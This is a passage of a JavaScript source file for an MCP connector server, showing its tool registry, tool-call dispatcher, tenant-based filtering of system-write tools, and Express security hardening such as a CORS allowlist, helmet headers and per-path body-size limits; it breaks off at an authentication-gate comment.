  // Data management (8)
  dataLoadToolDefinition,
  dataInfoToolDefinition,
  dataPreviewToolDefinition,
  dataListToolDefinition,
  dataDropToolDefinition,
  dataFilterToolDefinition,
  dataSelectToolDefinition,
  dataSampleToolDefinition,
  // Descriptive statistics (5)
  describeToolDefinition,
  frequencyToolDefinition,
  histogramToolDefinition,
  crosstabToolDefinition,
  normalityToolDefinition,
  // Inferential statistics (6)
  tTestToolDefinition,
  anovaToolDefinition,
  chiSquareToolDefinition,
  confidenceIntervalToolDefinition,
  mannWhitneyToolDefinition,
  proportionTestToolDefinition,
  // Regression & correlation (3)
  correlationToolDefinition,
  regressionToolDefinition,
  partialCorrelationToolDefinition,
  // Time series (3)
  timeSeriesAnalyzeToolDefinition,
  movingAverageToolDefinition,
  forecastToolDefinition,
  // Machine learning (6)
  kmeansToolDefinition,
  pcaToolDefinition,
  knnToolDefinition,
  naiveBayesToolDefinition,
  anomalyDetectionToolDefinition,
  featureImportanceToolDefinition,
  // Stats help
  {
    name: "stats_help",
    description:
      "Returns a categorised list of all available statistical and ML tools " +
      "with brief descriptions. Call this first to understand what statistical " +
      "analyses are available.",
    inputSchema: { type: "object", properties: {}, required: [] },
  },

  {
    name: "get_current_datetime",
    description: "Returns the current UTC date and time.",
    inputSchema: { type: "object", properties: {}, required: [] },
  },

  // ---------- Ava Skill Volume (v10.7.0) ----------
  // Only advertised when SKILL_FILE_PATH is configured so Claude does not
  // see tools that will always error in a non-provisioned environment.
  ...(SKILL_ENABLED
    ? [
        skillReadToolDefinition,
        skillWriteToolDefinition,
        skillWriteAdditionToolDefinition,
        skillMergeAdditionsToolDefinition,
        skillHistoryToolDefinition,
        skillRollbackToolDefinition,
        skillAuditToolDefinition,
        booksReadToolDefinition,
        booksLogWriteToolDefinition,
        // ---------- Content sections (archive / references / scripts) ----------
        archiveListToolDefinition,
        archiveReadToolDefinition,
        archiveWriteToolDefinition,
        referenceListToolDefinition,
        referenceReadToolDefinition,
        referenceWriteToolDefinition,
        scriptListToolDefinition,
        scriptReadToolDefinition,
        scriptWriteToolDefinition,
        scriptExecuteToolDefinition,
      ]
    : []),

  // ---------- Modular Skill System (v11.0.0) ----------
  // Only advertised when SKILL_MODULAR_ENABLED=true (requires SKILL_FILE_PATH).
  // skill_compile replaces skill_read at session start when modular mode is active.
  ...(SKILL_MODULAR_ENABLED
    ? [
        skillCompileToolDefinition,
        skillLoadSpecialistToolDefinition,
        skillRecompileToolDefinition,
        personalityWriteToolDefinition,
        dispatchRuleAddToolDefinition,
        moduleWriteToolDefinition,
      ]
    : []),

  // ---------- Ava User Profiles (v10.8.0) ----------
  // Enabled when SKILL_FILE_PATH or PROFILES_FILE_PATH is configured.
  // profile_read called at session start after skill_read.
  // profile_write_person called after substantive turns when profile-relevant
  // information emerges, and when a new person is confirmed after anomaly check.
  ...(PROFILES_ENABLED
    ? [
        profileReadToolDefinition,
        profileWritePersonToolDefinition,
      ]
    : []),

  // ---------- Ava Memory Sync - durable MySQL backup (v10.1.0) ----------
  // Only advertised when AVA_MEMORY_WP_URL and AVA_MEMORY_WP_KEY are configured.
  ...(config.avaMemoryWpUrl && config.avaMemoryWpKey
    ? [avaMemoryBackupToolDefinition, avaMemoryRestoreToolDefinition, avaMemorySyncStatusToolDefinition]
    : []),

  // ---------- Persistent Memory MCP (v10.0.0) ----------
  // Only advertised when MEMORY_AUTH_TOKEN is configured so Claude does not
  // see tools that will always return MEMORY_DISABLED in a misconfigured env.
  ...(MEMORY_ENABLED ? ALL_MEMORY_TOOL_DEFINITIONS : []),
];


// -----------------------------------------------------------------------
// dispatchToolCall  (v12.8.0)
// Extracted from the MCP CallToolRequestSchema handler.
// Used by both the MCP server and the REST /tool-call endpoint so that
// tool handler logic lives in exactly one place.
// Returns the raw MCP-format result { content, isError }.
// -----------------------------------------------------------------------

/**
 * Every tool this connector can expose, deduplicated by name. (v12.11.0)
 *
 * This is the tool *surface*, not a live capability list: it deliberately does
 * not apply the modular-mode, tenant or SYSTEM_WRITE filters that ListTools and
 * GET /tools apply, because its consumer is the Neural Core catalogue, which
 * describes what exists rather than what this session may call. Written to the
 * volume at boot so the scanner never has to ask the network what tools exist.
 *
 * @returns {Array<{name: string, description: string}>}
 */
function buildEffectiveToolList() {
  const modularDefinitions = [
    skillCompileToolDefinition,
    skillLoadSpecialistToolDefinition,
    skillRecompileToolDefinition,
    personalityWriteToolDefinition,
    dispatchRuleAddToolDefinition,
    moduleWriteToolDefinition,
  ];

  const byName = new Map();
  for (const tool of [...TOOLS, ...modularDefinitions]) {
    if (tool && typeof tool.name === "string" && tool.name && !byName.has(tool.name)) {
      byName.set(tool.name, tool);
    }
  }
  return [...byName.values()];
}

async function dispatchToolCall(name, args, context = null) {
  const _selfModelStartedAt = Date.now();
  const result = await dispatchToolCallCore(name, args, context);
  // Fire-and-forget: the hook has its own try/catch, and this one is the
  // belt to its braces. A Neural Core problem must never surface as a tool
  // failure to the caller.
  try {
    brainScanOnToolCompleted(name, args, result);
  } catch (hookErr) {
    log("warn", `brain_scan hook error after ${name}: ${hookErr.message}`);
  }
  // Self-Model Interrogation (Phase 1): record module_activations and tool_usage
  // after every turn. Fully guarded; can never surface as a tool failure.
  // `context` (when present) carries the caller's per-call {tenant_id, user_id}
  // so records are scoped per-user-per-tenant. It is null for direct MCP calls,
  // in which case the hook falls back to session context.
  try {
    selfModelRecordToolCall(name, args, result, _selfModelStartedAt, context);
  } catch (hookErr) {
    log("warn", `self_model hook error after ${name}: ${hookErr.message}`);
  }
  return result;
}

async function dispatchToolCallCore(name, args, context = null) {
      switch (name) {
        // ---------- TrueSource Client Gateway session init (v12.3.0) ----------
        case "ts_gateway_session_init": return await handleTsGatewaySessionInit(args);

        // ---------- Tenax UI Tools (v12.40.0) ----------
        case "personal_chef_find":          return await handlePersonalChefFind(args);
        case "weight_loss_adapt":           return await handleWeightLossAdapt(args);

        case "web_search":                  return await handleWebSearch(args);
        case "news_search":                 return await handleNewsSearch(args);
        case "image_search":                return await handleImageSearch(args);
        case "linkedin_load_connections":   return await handleLinkedinLoad(args);
        case "linkedin_search_connections": return await handleLinkedinSearch(args);
        case "linkedin_connection_count":   return await handleLinkedinCount(args);
        case "linkedin_get_profile":        return await handleLinkedinProfile(args);
        case "linkedin_start_oauth":        return await handleLinkedinOAuthStart(args);
        case "linkedin_oauth_status":       return await handleLinkedinOAuthStatus(args);
        case "linkedin_oauth_logout":       return await handleLinkedinOAuthLogout(args);
        case "linkedin_get_live_profile":   return await handleLinkedinLiveProfile(args);
        case "set_wordpress_credentials":   return await handleSetWordPressCredentials(args);
        case "get_wordpress_credentials":   return await handleGetWordPressCredentials(args);
        case "clear_wordpress_credentials": return await handleClearWordPressCredentials(args);
        case "set_linkedin_credentials":    return await handleSetLinkedInCredentials(args);
        case "get_linkedin_credentials":    return await handleGetLinkedInCredentials(args);
        case "clear_linkedin_credentials":  return await handleClearLinkedInCredentials(args);
        case "wordpress_site_info":         return await handleWpSiteInfo(args);
        case "wordpress_list_posts":        return await handleWpListPosts(args);
        case "wordpress_list_pages":        return await handleWpListPages(args);
        case "wordpress_list_categories":   return await handleWpListCategories(args);
        case "wordpress_list_tags":         return await handleWpListTags(args);
        case "wordpress_create_category":   return await handleWpCreateCategory(args);
        case "wordpress_create_tags":       return await handleWpCreateTags(args);
        case "wordpress_list_menus":        return await handleWpListMenus(args);
        case "wordpress_list_menu_items":   return await handleWpListMenuItems(args);
        case "wordpress_create_post":       return await handleWpCreatePost(args);
        case "wordpress_create_page":       return await handleWpCreatePage(args);
        case "wordpress_add_menu_item":     return await handleWpAddMenuItem(args);
        case "wordpress_update_content":    return await handleWpUpdateContent(args);
        case "wordpress_set_seo_meta":      return await handleWpSetSeoMeta(args);
        case "wordpress_create_service_page": return await handleWpCreateServicePage(args);
        case "image_download":              return await handleImageDownload(args);
        case "image_search_download":       return await handleImageSearchDownload(args);
        case "wordpress_upload_media":      return await handleWpUploadMedia(args);
        case "wordpress_set_featured_image":return await handleWpSetFeaturedImage(args);
        case "wordpress_get_content":       return await handleWpGetContent(args);
        case "wordpress_health":            return await handleWpHealth(args);
        case "google_drive_list":           return await handleGoogleDriveList(args);
        case "google_drive_check_connection":      return await handleGoogleDriveCheckConnection(args);
        case "google_drive_search_files":          return await handleGoogleDriveSearchFiles(args);
        case "google_drive_read_file_content":     return await handleGoogleDriveReadFileContent(args);
        case "google_drive_download_file_content": return await handleGoogleDriveDownloadFileContent(args);
        case "google_drive_create_file":           return await handleGoogleDriveCreateFile(args);
        case "google_drive_overwrite_file":        return await handleGoogleDriveOverwriteFile(args);
        case "google_drive_get_file_metadata":     return await handleGoogleDriveGetFileMetadata(args);
        case "google_drive_list_recent_files":     return await handleGoogleDriveListRecentFiles(args);
        case "google_drive_get_file_permissions":  return await handleGoogleDriveGetFilePermissions(args);
        case "psychology_emotion_taxonomy":  return await handlePsychologyEmotionTaxonomy(args);
        case "psychology_sentiment_analyze": return await handlePsychologySentimentAnalyze(args);
        case "psychology_alignment_assess":  return await handlePsychologyAlignmentAssess(args);
        case "self_model_query":             return await handleSelfModelQuery(args);
        case "self_state_write":             return await handleSelfStateWrite(args);
        case "self_state_read":              return await handleSelfStateRead(args);
        case "nudge_analyze":                return await handleNudgeAnalyze(args);
        case "nudge_check":                  return await handleNudgeCheck(args);
        case "nudge_action":                 return await handleNudgeAction(args);
        case "student_model_observe":        return await handleStudentModelObserve(args);
        case "student_model_relate":         return await handleStudentModelRelate(args);
        case "socratic_seam_question":       return await handleSocraticSeamQuestion(args);
        case "student_model_read":           return await handleStudentModelRead(args);
        case "homework_assess_render":       return await handleHomeworkAssessRender(args);

        // ---------- TrueSource outreach direct send ----------
        case "email_send":                   return await handleEmailSend(args);
        case "email_get_config":             return await handleEmailGetConfig(args);
        case "email_get_sender_profiles":    return await handleEmailGetSenderProfiles(args);
        case "email_validate_address":       return await handleEmailValidateAddress(args);
        case "email_schedule":               return await handleEmailSchedule(args);
        case "email_schedule_cancel":        return await handleEmailScheduleCancel(args);
        case "email_schedule_list":          return await handleEmailScheduleList(args);

        // ---------- Google Calendar (v8.0.0) ----------
        case "calendar_list_events":   return await handleCalendarListEvents(args);
        case "calendar_create_event":  return await handleCalendarCreateEvent(args);
        case "calendar_update_event":  return await handleCalendarUpdateEvent(args);
        case "calendar_delete_event":  return await handleCalendarDeleteEvent(args);

        // ---------- Google Sheets (v8.0.0) ----------
        case "sheets_get_metadata":    return await handleSheetsGetMetadata(args);
        case "sheets_read_range":      return await handleSheetsReadRange(args);
        case "sheets_write_range":     return await handleSheetsWriteRange(args);
        case "sheets_append_rows":     return await handleSheetsAppendRows(args);

        // ---------- Inbound Webhook (v8.0.0) ----------
        case "webhook_poll_events":    return await handleWebhookPollEvents(args);
        case "webhook_clear_events":   return await handleWebhookClearEvents(args);
        case "webhook_queue_status":   return await handleWebhookQueueStatus(args);

        // ---------- Slack / Teams messaging (v8.0.0) ----------
        case "slack_send_message":     return await handleSlackSendMessage(args);
        case "teams_send_message":     return await handleTeamsSendMessage(args);

        // ---------- Full page web fetch (v8.0.0) ----------
        case "web_fetch_page":         return await handleWebFetchPage(args);

        // ---------- Statistical analysis & ML (v9.0.0) ----------
        // Data management
        case "data_load":    return await handleDataLoad(args);
        case "data_info":    return await handleDataInfo(args);
        case "data_preview": return await handleDataPreview(args);
        case "data_list":    return await handleDataList(args);
        case "data_drop":    return await handleDataDrop(args);
        case "data_filter":  return await handleDataFilter(args);
        case "data_select":  return await handleDataSelect(args);
        case "data_sample":  return await handleDataSample(args);
        // Descriptive
        case "stats_describe":   return await handleDescribe(args);
        case "stats_frequency":  return await handleFrequency(args);
        case "stats_histogram":  return await handleHistogram(args);
        case "stats_crosstab":   return await handleCrosstab(args);
        case "stats_normality":  return await handleNormality(args);
        // Inferential
        case "stats_ttest":               return await handleTTest(args);
        case "stats_anova":               return await handleAnova(args);
        case "stats_chi_square":          return await handleChiSquare(args);
        case "stats_confidence_interval": return await handleConfidenceInterval(args);
        case "stats_mann_whitney":        return await handleMannWhitney(args);
        case "stats_proportion_test":     return await handleProportionTest(args);
        // Regression & correlation
        case "stats_correlation":         return await handleCorrelation(args);
        case "stats_regression":          return await handleRegression(args);
        case "stats_partial_correlation": return await handlePartialCorrelation(args);
        // Time series
        case "ts_analyze":        return await handleTimeSeriesAnalyze(args);
        case "ts_moving_average": return await handleMovingAverage(args);
        case "ts_forecast":       return await handleForecast(args);
        // Machine learning
        case "ml_kmeans":             return await handleKMeans(args);
        case "ml_pca":                return await handlePCA(args);
        case "ml_knn":                return await handleKNN(args);
        case "ml_naive_bayes":        return await handleNaiveBayes(args);
        case "ml_anomaly_detection":  return await handleAnomalyDetection(args);
        case "ml_feature_importance": return await handleFeatureImportance(args);
        case "stats_help":            return { content: [{ type: "text", text: STATS_HELP_TEXT }] };

        case "get_current_datetime":
          return { content: [{ type: "text", text: JSON.stringify(getCurrentDateTime(), null, 2) }] };

        // ---------- Ava Skill Volume (v10.7.0) ----------
        case "skill_read":              return await handleSkillRead(args);
        case "skill_write":             return await handleSkillWrite(args);
        case "skill_write_addition":    return await handleSkillWriteAddition(args);
        case "skill_merge_additions":   return await handleSkillMergeAdditions(args);
        case "skill_history":           return await handleSkillHistory(args);
        case "skill_rollback":          return await handleSkillRollback(args);
        case "skill_audit":             return await handleSkillAudit(args);
        // ---------- Modular Skill System (v11.0.0) ----------
        case "skill_compile":           return await handleSkillCompile(args, context);
        case "skill_load_specialist":   return await handleSkillLoadSpecialist(args);
        case "skill_recompile":         return await handleSkillRecompile(args, context);
        case "personality_write": {
          const _personalityResult = await handlePersonalityWrite(args);
          // Non-blocking WordPress gateway backup (tenant mode only).
          if (SKILL_BASE_DIR) {
            backupPersonalFileToGateway("PERSONALITY.md", `${SKILL_BASE_DIR}/PERSONALITY.md`)
              .catch(() => {}); // swallow - never let backup failure propagate
          }
          return _personalityResult;
        }
        case "dispatch_rule_add": {
          const _dispatchResult = await handleDispatchRuleAdd(args);
          // Non-blocking WordPress gateway backup (tenant mode only).
          if (SKILL_BASE_DIR) {
            backupPersonalFileToGateway("DISPATCH_RULES.json", `${SKILL_BASE_DIR}/DISPATCH_RULES.json`)
              .catch(() => {});
          }
          return _dispatchResult;
        }
        case "module_write":            return await handleModuleWrite(args);
        case "books_read":             return await handleBooksRead(args);
        case "books_log_write":        return await handleBooksLogWrite(args);
        // ---------- Content Sections: Archive / References / Scripts (v11.5.0) ----------
        case "archive_list":            return handleArchiveList(args);
        case "archive_read":            return handleArchiveRead(args);
        case "archive_write":           return await handleArchiveWrite(args);
        case "reference_list":          return handleReferenceList(args);
        case "reference_read":          return handleReferenceRead(args);
        case "reference_write":         return await handleReferenceWrite(args);
        case "script_list":             return handleScriptList(args);
        case "script_read":             return handleScriptRead(args);
        case "script_write":            return await handleScriptWrite(args);
        case "script_execute":          return await handleScriptExecute(args);

        // ---------- Ava User Profiles (v10.8.0) ----------
        case "profile_read":           return await handleProfileRead(args, context);
        case "profile_write_person": {
          const _profileResult = await handleProfileWritePerson(args, context);
          // Non-blocking WordPress gateway backup (tenant mode only).
          if (PROFILES_ENABLED && SKILL_BASE_DIR) {
            backupPersonalFileToGateway("PROFILES.md", `${SKILL_BASE_DIR}/PROFILES.md`)
              .catch(() => {});
          }
          return _profileResult;
        }

        // ---------- Ava Memory Sync - durable MySQL backup (v10.1.0) ----------
        case "ava_memory_backup":       return await handleAvaMemoryBackup(args);
        case "ava_memory_restore":      return await handleAvaMemoryRestore(args);
        case "ava_memory_sync_status":  return await handleAvaMemorySyncStatus();

        // ---------- Peer Review: health log tools (v12.5.0 - tenant mode) ----------
        case "health_log_write":         return await handleHealthLogWrite(args);
        case "issue_flag":               return await handleIssueFlag(args);
        case "peer_review_consent_set":  return await handlePeerReviewConsent(args);

        // ---------- Post-session extraction + scoring (tenant mode) ----------
        case "knowledge_graph_extract":  return await handleKnowledgeGraphExtract(args);
        case "quality_score_submit":     return await handleQualityScoreSubmit(args);

        // ---------- Peer Review: check-in tools (v12.5.0 - owner mode) ----------
        case "client_registry_update":  return await handleClientRegistryUpdate(args);
        case "client_checkin":          return await handleClientCheckin(args);
        case "escalation_queue_read":   return await handleEscalationQueueRead(args);

        default:
          // ---------- v10.0.0: Persistent Memory MCP ----------
          if (MEMORY_TOOL_NAMES.has(name)) {
            if (!MEMORY_ENABLED) {
              return {
                content: [
                  {
                    type: "text",
                    text: JSON.stringify(
                      {
                        error:
                          "Memory subsystem is disabled. Set AVA_MEMORY_WP_URL+AVA_MEMORY_WP_KEY (MySQL-primary) or MEMORY_AUTH_TOKEN (SQLite fallback) in Railway Variables to enable.",
                        code: "MEMORY_DISABLED",
                      },
                      null,
                      2,
                    ),
                  },
                ],
                isError: true,
              };
            }
            return await dispatchMemoryTool(name, args);
          }
          throw new Error(`Unknown tool: "${name}"`);
      }
}

// -----------------------------------------------------------------------
// MCP Server factory
// -----------------------------------------------------------------------
const SYSTEM_WRITE_TOOLS = new Set([
  'skill_write', 'skill_write_addition', 'skill_merge_additions', 'skill_rollback',
  'module_write', 'script_write', 'archive_write', 'reference_write',
  'dispatch_rule_add',
]);

function createMcpServer(tenantContext) {
  const server = new Server(
    { name: "claude-connector", version: "12.26.0" },
    { capabilities: { tools: {} } }
  );

  server.setRequestHandler(ListToolsRequestSchema, async () => {
    // Build the effective tool list at request time so that modular mode changes
    // (written via POST /set-modular-mode) take effect without a Railway redeploy.
    // The static TOOLS array is correct for all non-modular tools; we just replace
    // the modular section with a live isModularEnabled() check.
    const MODULAR_TOOL_NAMES = new Set([
      "skill_compile", "skill_load_specialist", "skill_recompile", "personality_write", "dispatch_rule_add", "module_write",
    ]);
    const baseTools = TOOLS.filter(t => !MODULAR_TOOL_NAMES.has(t.name));
    const modularTools = isModularEnabled()
      ? [
          skillCompileToolDefinition,
          skillLoadSpecialistToolDefinition,
          skillRecompileToolDefinition,
          personalityWriteToolDefinition,
          dispatchRuleAddToolDefinition,
          moduleWriteToolDefinition,
        ]
      : [];
    const allTools = [...baseTools, ...modularTools];

    // v13.0.0: Tenant tool filtering — non-Brian tenants cannot modify system files.
    // System-write tools are blocked. Memory/personality/profile writes pass through.
   const tenantId = tenantContext?.tenantId || null;
    if (tenantId && tenantId !== 'ava') {
      return { tools: allTools.filter(t => !SYSTEM_WRITE_TOOLS.has(t.name)) };
    }
    return { tools: allTools };
  });

  server.setRequestHandler(CallToolRequestSchema, async (request) => {
    const { name, arguments: args } = request.params;
    log("info", `Tool: ${name}`);
    try {
      // Dispatch to the central handler (defined above createMcpServer).
      // personality_write / dispatch_rule_add / profile_write_person
      // all include their WordPress gateway backup logic inside dispatchToolCall.
      return await dispatchToolCall(name, args);
    } catch (err) {
      log("error", `Tool "${name}" error: ${err.message}`);
      return { content: [{ type: "text", text: `Error: ${err.message}` }], isError: true };
    }
  });

  return server;
}

// -----------------------------------------------------------------------
// Stats / ML help text (v9.0.0)
// -----------------------------------------------------------------------
const STATS_HELP_TEXT = `
Claude Connector  v9.0.0  -  Statistical Analysis & ML Toolkit
${"=".repeat(65)}

DATA MANAGEMENT (load, inspect, transform)
  data_load          Load CSV, TSV, JSON, or Excel files (or inline data)
  data_info          Column types, missing values, unique counts, preview
  data_preview       Show first/last N rows as a table
  data_list          List all loaded datasets with sizes
  data_drop          Remove a dataset from memory
  data_filter        Create a filtered subset (eq, gt, in, not_null, etc.)
  data_select        Keep/rename specific columns
  data_sample        Random sample (by N or fraction, seeded)

DESCRIPTIVE STATISTICS
  stats_describe     Mean, median, SD, IQR, skewness, kurtosis, CV, SE
  stats_frequency    Frequency table with counts and cumulative %
  stats_histogram    Binned distribution with bar visualisation
  stats_crosstab     Cross-tabulation of two categorical columns + chi-square
  stats_normality    Jarque-Bera, D'Agostino-Pearson, Q-Q comparison

INFERENTIAL STATISTICS / HYPOTHESIS TESTS
  stats_ttest        One-sample, two-sample (Welch), or paired t-test
  stats_anova        One-way ANOVA + Tukey HSD post-hoc tests
  stats_chi_square   Chi-square goodness of fit or independence test
  stats_confidence_interval  CI for mean at 90%, 95%, 99%
  stats_mann_whitney Non-parametric two-group comparison (U test)
  stats_proportion_test  One- or two-sample z-test for proportions

REGRESSION & CORRELATION
  stats_correlation       Pearson/Spearman/Kendall correlation matrix
  stats_regression        Simple linear, multiple linear, polynomial, logistic
  stats_partial_correlation  Correlation controlling for covariates

TIME SERIES
  ts_analyze         Trend, stationarity (ADF), ACF, PACF, seasonality
  ts_moving_average  SMA, EMA, WMA with configurable window
  ts_forecast        Holt-Winters, SES, or linear trend forecasting

MACHINE LEARNING
  ml_kmeans          K-Means clustering with elbow method + silhouette score
  ml_pca             Principal Component Analysis with loadings + scores
  ml_knn             K-Nearest Neighbours classifier with cross-validation
  ml_naive_bayes     Gaussian Naive Bayes classifier with cross-validation
  ml_anomaly_detection  Z-score, IQR, Isolation Forest, Mahalanobis
  ml_feature_importance  Rank predictors by correlation/MI/ANOVA F-ratio

TYPICAL WORKFLOW:
  1. data_load        (load your file)
  2. data_info        (understand the structure)
  3. stats_describe   (summarise key columns)
  4. stats_normality  (check distributions)
  5. stats_correlation or stats_regression (analyse relationships)
  6. ml_kmeans or ml_pca (if exploratory/unsupervised)
  7. ml_knn or ml_naive_bayes (if classification needed)

All results include effect sizes, p-values with significance stars,
and plain-English interpretation of findings.
`.trim();

// -----------------------------------------------------------------------
// Express app
// -----------------------------------------------------------------------
// ---------------------------------------------------------------------------
// Process guards  (v12.28.0 -- TNX-H-006)
//
// Installed before the app is constructed, so a rejection or throw during route
// registration is caught rather than producing a silent exit. The connector
// previously had NO unhandledRejection and NO uncaughtException handler at all:
// a rejected promise in an async tool handler produced no log line and left the
// caller's socket hanging until it timed out.
// ---------------------------------------------------------------------------
installProcessGuards({ log });

// ---------------------------------------------------------------------------
// Credential storage  (v12.30.0 -- TNX-H-014)
//
// Runs before anything can read a credential. Two steps:
//
//   1. Migrate any credentials left at the legacy in-image path /app/data/.
//      Those were written by earlier versions and would be destroyed by the
//      next redeploy, silently, which is the data-loss half of TNX-H-014.
//   2. Verify the configured directory is on a persistent volume and writable,
//      and log loudly if it is not. The absence of this check is why the
//      original defect went unnoticed: credentials appeared to save and then
//      vanished at the next deploy with no error at any point.
//
// Reported rather than fatal. An unwritable credential directory must not stop
// a connector that is otherwise fully functional from serving its other tools.
// ---------------------------------------------------------------------------
migrateLegacyCredentials();
checkStorageLocation();

// ---------------------------------------------------------------------------
// Version  (v12.28.0 -- TNX-M-005)
//
// Previously the /health handler carried a hardcoded "12.26.0" while
// package.json said 12.27.0, so the field misidentified the running build and
// was actively misleading during an incident. Read it from package.json once
// at boot instead, so the two can never disagree.
//
// Wrapped because a container built without package.json present must still
// start; an unknown version is a degraded log line, not a reason to refuse
// service.
// ---------------------------------------------------------------------------
const CONNECTOR_VERSION = (() => {
  try {
    const pkgPath = new URL("../package.json", import.meta.url);
    return JSON.parse(readFileSync(pkgPath, "utf8")).version || "unknown";
  } catch {
    return "unknown";
  }
})();

const app = express();

// v12.28.0: the connector runs behind the Railway edge proxy. Without this,
// req.ip is the proxy address and every caller shares one rate-limit bucket.
// The value is the number of proxy hops to trust, NOT `true`: trusting all
// proxies lets a caller forge X-Forwarded-For and evade the limiter entirely.
app.set("trust proxy", parseInt(process.env.TRUST_PROXY_HOPS || "1", 10));

// ---------------------------------------------------------------------------
// Security headers  (v12.28.0 -- TNX-M-021)
//
// contentSecurityPolicy is disabled at this level because the connector already
// sets its own frame-ancestors policy in the CORS handler below (derived from
// MCP_ALLOWED_ORIGINS) and a much stricter sandbox policy on /preview
// responses (TNX-C-010). Letting helmet install a second, weaker default policy
// would overwrite both.
//
// crossOriginResourcePolicy is disabled because the Tenax chat surface loads
// /api/config.js and the document preview iframe cross-origin by design; that
// access is governed by the explicit CORS allowlist instead.
// ---------------------------------------------------------------------------
app.use(helmet({
  contentSecurityPolicy:     false,
  crossOriginResourcePolicy: false,
  crossOriginEmbedderPolicy: false,
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: false },
  referrerPolicy: { policy: "strict-origin-when-cross-origin" },
  frameguard: false,   // frame-ancestors is set explicitly in the CORS handler
}));

// ---------------------------------------------------------------------------
// Response compression
//
// The filter is load-bearing. This service exposes the legacy SSE transport at
// /sse and the Streamable HTTP transport at /mcp, both of which must deliver
// each frame the moment it is written. compression() buffers to build deflate
// blocks, so mounting it with the default filter would hold MCP frames in the
// compressor and stall the transport in a way that looks like a network fault.
// ---------------------------------------------------------------------------
app.use(compression({
  filter: (req, res) => {
    if (req.headers["x-no-compression"]) return false;

    // Both MCP transports stream. Exclude them by path as well as by content
    // type, because the content type is not set until the transport writes its
    // first frame, which is after this filter has already run.
    if (req.path === "/sse" || req.path === "/messages" || req.path === "/mcp") return false;

    const contentType = String(res.getHeader("Content-Type") || "");
    if (contentType.includes("text/event-stream")) return false;

    return compression.filter(req, res);
  },
  threshold: 1024,
}));

// ---------------------------------------------------------------------------
// Body parsing with per-path limits  (v12.28.0 -- TNX-C-003 resolution item 4)
//
// The body limit was globally 50mb (raised in v9.0.0 for inline-data dataset
// loading). That ceiling applied to every route, including ones that accept
// only a handful of short string fields, and it was one of the two components
// of the volume-exhaustion risk in TNX-C-003.
//
// Two parsers are now built. A dispatching middleware selects the large one
// only for the routes that genuinely carry bulk payloads -- MCP transports
// (inline datasets and tool arguments), file uploads, volume restores and the
// skill compiler -- and the small one for everything else.
//
// The dispatcher is used rather than per-route parsers because a globally
// mounted express.json() consumes and validates the stream before any route
// middleware runs, so a per-route parser mounted later can never widen a limit
// the global parser has already rejected.
// ---------------------------------------------------------------------------
const SMALL_BODY_LIMIT = process.env.MCP_BODY_LIMIT       || "2mb";
const LARGE_BODY_LIMIT = process.env.MCP_LARGE_BODY_LIMIT || "50mb";

/** Paths permitted to send a large request body. */
const LARGE_BODY_PATHS = [
  { exact:  "/mcp" },
  { exact:  "/messages" },
  { exact:  "/tool-call" },
  { exact:  "/data/upload" },
  { exact:  "/upload/connections" },
  { exact:  "/brain-scan" },
  { exact:  "/ti-skill-compile" },
  { prefix: "/restore-" },
];

/**
 * True when the request path is allowed the large body limit.
 * @param {string} pathname req.path
 * @returns {boolean}
 */
function allowsLargeBody(pathname) {
  const p = String(pathname || "");
  return LARGE_BODY_PATHS.some(
    (r) => (r.exact !== undefined && p === r.exact) ||
           (r.prefix !== undefined && p.startsWith(r.prefix))
  );
}

const smallJsonParser = express.json({ limit: SMALL_BODY_LIMIT });
const largeJsonParser = express.json({ limit: LARGE_BODY_LIMIT });

app.use((req, res, next) => {
  const parser = allowsLargeBody(req.path) ? largeJsonParser : smallJsonParser;
  parser(req, res, next);
});

// ---------------------------------------------------------------------------
// CORS  (v12.28.0 -- remediates TNX-C-008)
//
// Previously this handler set `Access-Control-Allow-Origin: *` unconditionally
// on every route. The connector is a server-to-server component; the only
// browser-originated traffic it serves is the Tenax chat surface loading
// /api/config.js, /data/upload and the document preview iframe.
//
// New behaviour: an explicit allowlist read from MCP_ALLOWED_ORIGINS
// (comma-separated). When the variable is unset, NO CORS headers are emitted
// at all, which is the correct default for a server-to-server service and
// blocks every cross-origin browser request. Origins are normalised
// (lowercased, trailing slash stripped) before comparison so that casing
// cannot be used to bypass the list.
//
// `Vary: Origin` is mandatory whenever the response varies by request origin,
// otherwise a shared cache can serve one origin's allowed response to another.
// ---------------------------------------------------------------------------

/**
 * Normalise an origin for comparison: lowercase, no trailing slash.
 * @param {string} value Raw origin string.
 * @returns {string} Normalised origin, or '' when not usable.
 */
function normaliseOrigin(value) {
  const s = String(value || "").trim().toLowerCase().replace(/\/+$/, "");
  return s;
}

const MCP_ALLOWED_ORIGINS = String(process.env.MCP_ALLOWED_ORIGINS || "")
  .split(",")
  .map(normaliseOrigin)
  .filter(Boolean);

// A literal "*" in the allowlist is refused rather than honoured. Reflecting
// arbitrary origins is the defect TNX-C-008 describes; silently accepting the
// wildcard here would reintroduce it through configuration.
if (MCP_ALLOWED_ORIGINS.includes("*")) {
  console.error(
    "[FATAL] MCP_ALLOWED_ORIGINS contains '*'. Wildcard CORS is not supported. " +
    "List the exact origins that must reach this connector, or leave the variable " +
    "unset to emit no CORS headers at all."
  );
  process.exit(1);
}

// Frame-ancestors for the document preview iframe embedded by the Tenax UI.
// Defaults to 'none' (no framing) unless origins are explicitly configured.
const FRAME_ANCESTORS = MCP_ALLOWED_ORIGINS.length
  ? MCP_ALLOWED_ORIGINS.join(" ")
  : "'none'";

app.use((req, res, next) => {
  const origin = normaliseOrigin(req.headers.origin);

  // Vary must be set unconditionally, including on responses that carry no
  // Access-Control-Allow-Origin, so caches key on Origin either way.
  res.setHeader("Vary", "Origin");

  if (origin && MCP_ALLOWED_ORIGINS.includes(origin)) {
    // Echo the caller's own origin string (not the normalised form) only after
    // the normalised form has matched, so the browser's byte comparison passes.
    res.setHeader("Access-Control-Allow-Origin", String(req.headers.origin).trim());
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, X-MCP-Api-Key, Mcp-Session-Id, Accept");
    res.setHeader("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
    res.setHeader("Access-Control-Max-Age", "600");
  }

  // Baseline response hardening applied to every response.
  res.setHeader("Content-Security-Policy", `frame-ancestors ${FRAME_ANCESTORS};`);
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");

  if (req.method === "OPTIONS") { res.sendStatus(204); return; }
  next();
});

// ---------------------------------------------------------------------------
// Authentication gate  (v12.28.0 -- remediates TNX-C-001)
//
// Mounted here, before every route registration below, so that the route
// coverage assertion in assertAllRoutesCovered() can prove that no route is
// registered ahead of it. Routes that carry their own credential, and the
